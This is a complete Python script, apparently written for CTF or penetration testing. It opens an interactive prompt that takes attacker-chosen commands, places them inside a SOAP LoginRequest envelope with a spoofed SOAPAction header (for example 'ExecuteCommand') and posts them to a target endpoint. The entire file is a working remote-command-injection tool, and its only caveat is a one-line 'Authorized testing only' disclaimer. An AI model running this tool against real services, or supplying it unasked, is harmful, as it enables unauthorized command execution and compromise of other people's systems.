#!/usr/bin/env python3
"""Interactive SOAP injector — submit attacker-controlled commands inside a SOAP envelope.

Usage:
    python3 soap_spoof.py --target http://<TARGET>/wsdl --action '"ExecuteCommand"'

Authorized testing only.
"""
import argparse
import sys

import requests

ENVELOPE_TMPL = (
    '<?xml version="1.0" encoding="utf-8"?>'
    '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" '
    'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
    'xmlns:tns="http://tempuri.org/" '
    'xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">'
    '<soap:Body><LoginRequest xmlns="http://tempuri.org/">'
    '<METHOD>{cmd}</METHOD><password>pass</password>'
    '</LoginRequest></soap:Body></soap:Envelope>'
)


def send(target: str, cmd: str, soap_action: str, timeout: float,
         proxy: str | None) -> None:
    proxies = {"http": proxy, "https": proxy} if proxy else None
    body = ENVELOPE_TMPL.format(cmd=cmd)
    headers = {"SOAPAction": soap_action, "Content-Type": "text/xml; charset=utf-8"}
    r = requests.post(target, data=body, headers=headers, proxies=proxies, timeout=timeout)
    sys.stdout.buffer.write(r.content + b"\n")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", required=True, help="Full SOAP endpoint URL (e.g. http://10.10.10.10:3002/wsdl)")
    parser.add_argument("--action", default='""', help='SOAPAction header value, e.g. \'"ExecuteCommand"\' (default: empty)')
    parser.add_argument("--timeout", type=float, default=15.0, help="Per-request timeout (default: 15)")
    parser.add_argument("--proxy", default=None, help="HTTP(S) proxy URL")
    args = parser.parse_args()

    try:
        while True:
            try:
                cmd = input("$ ")
            except EOFError:
                return 0
            try:
                send(args.target, cmd, args.action, args.timeout, args.proxy)
            except requests.exceptions.RequestException as exc:
                print(f"[!] request error: {exc}", file=sys.stderr)
    except KeyboardInterrupt:
        print("\n[!] Interrupted.", file=sys.stderr)
        return 130


if __name__ == "__main__":
    sys.exit(main())
